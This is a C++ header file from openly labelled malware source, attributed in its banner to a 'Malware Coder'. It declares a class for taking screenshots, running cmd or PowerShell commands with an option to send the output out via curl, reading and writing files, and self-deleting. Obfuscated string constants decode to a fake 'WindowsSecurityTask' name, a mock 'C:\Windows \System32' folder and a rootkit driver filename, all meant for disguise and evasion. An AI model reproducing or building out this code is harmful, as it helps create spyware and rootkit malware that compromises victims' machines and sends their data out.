/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#ifndef TOOLS_H
#define TOOLS_H

#include <iostream>
#include <Windows.h>
#include <array>

#define UNLEN 256 // User Name Length


//#define HIDE_NAME std::string(decode("ecsSowndWiskTatyriu"))					// decode -> WindowsSecurityTask
//#define UNLEN 256 // User Name Length
//#define SELF_DELETE std::string(decode("teledethpa_"))							// decode -> delete_path
//#define MOCK_FOLDER std::string(decode("s owndWi:\\2Cm3teys\\S"))					// decode -> C:\\Windows \\System32
//#define ROOTKIT_SYS_FILE_NAME std::string(decode("ricuSewsdoinrWverikDasyTt"))	// decode -> WindowsSecurityTaskDriver



class Tools
{
	// Screenshot
	BOOL gdiscreen(std::string savePath);
	int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

protected:

	std::string Computer_Username;

	BOOL dirExists(const std::string& dirName_in); // Check if directory is exists
	BOOL FileExists(const std::string& path); // Check if file is exists
	BOOL WriteToFile(const std::string& path, const std::string& data, HANDLE hFile = NULL); // Write data to a file
	std::string ReadFromFile(const std::string& path); // Read from file
	std::string CMD(std::string command, BOOL modify_for_curl_send = FALSE, BOOL powershell = FALSE,  BOOL changeDirectory = FALSE, BOOL fileExplorer = FALSE); // Execute command on the cmd (or powershell) and get the result
	BOOL TakeScreenshot(const std::string& save_path); // Take a screenshot and save to file at specific path
	

public:

	const std::string HIDE_NAME;
	const std::string SELF_DELETE;
	const std::string MOCK_FOLDER;
	const std::string ROOTKIT_SYS_FILE_NAME;

	Tools();

	BOOL isSystem32Bit(); // Check if the system is 32-bit or 64-bit
	std::string GetThisProgramPath();
	std::string GetMyName();

	BOOL isProcessRunning(const std::string& process_name);

	// ObfuscateStrings.cpp
	std::string decode(std::string encoded_text);


};



#endif // !TOOLS_H
